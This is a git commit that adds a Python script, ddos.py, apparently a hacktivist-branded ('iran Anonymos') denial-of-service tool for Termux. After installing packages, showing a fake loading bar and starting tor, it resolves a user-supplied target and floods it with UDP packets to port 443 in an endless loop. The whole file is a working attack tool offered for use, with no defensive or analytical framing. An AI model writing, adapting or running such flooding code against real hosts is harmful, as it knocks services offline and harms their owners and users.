daae733404785cf1f0bdc5175a8761e84d2ae5a9
hacker112281 <103533467+hacker112281@users.noreply.github.com>
2022-04-21 12:29:07 +0430

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,46 @@
+import os
+import time
+import socket
+
+print("iran Anonymos")
+time.sleep(7)
+red='\033[31m'
+green='\033[32m'
+os.system("pkg install git -y ")
+os.system("pkg install python3 -y ")
+os.system("pkg install figlet -y ")
+os.system("clear")
+os.system("toilet -f mono12 -F gay DDOS")
+print(f"{green}==================================")
+print(" made by anonymos ")
+print(" my telegram id: @.... ")
+print( "   =====================================")
+target = input(f"{green} : ")
+target.replace("http://", "")
+target.replace("https://","")
+target.replace("www.","")
+ip = socket.gethostbyname(target)
+port = 443
+joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
+os.system("clear")
+os.system("toilet -f mono12 LOADING | lolcat")
+print("chek{... }5%")
+time.sleep(1)
+print("secorote{..... }10%")
+time.sleep(2)
+print("Loading{......... }40%")
+time.sleep(3)
+print("amade saze {............. }90%")
+time.sleep(4)
+print("goooooooooo{....................100%")
+time.sleep(6)
+print("please    whit")
+time.sleep(4)
+os.system("tor")
+time.sleep(8)
+os.system("clear")
+os.system("figlet Attack_Starting")
+while True:
+     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
+     print(port,"... packet to ...",ip)
